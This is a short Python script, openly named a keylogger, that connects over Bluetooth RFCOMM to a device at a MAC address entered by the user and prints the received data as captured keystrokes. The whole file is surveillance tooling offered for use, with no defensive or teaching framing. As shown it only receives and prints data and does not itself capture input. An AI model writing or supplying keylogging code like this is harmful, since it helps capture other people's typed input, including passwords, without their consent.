import bluetooth

def start_keylogger(mac_address):
    client_sock = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
    client_sock.connect((mac_address, 16))

    while True:
        data = client_sock.recv(1024).decode()
        if data:
            print("Keystrokes: " + data)

if __name__ == "__main__":
    mac_address = input("Enter MAC address: ")

    start_keylogger(mac_address)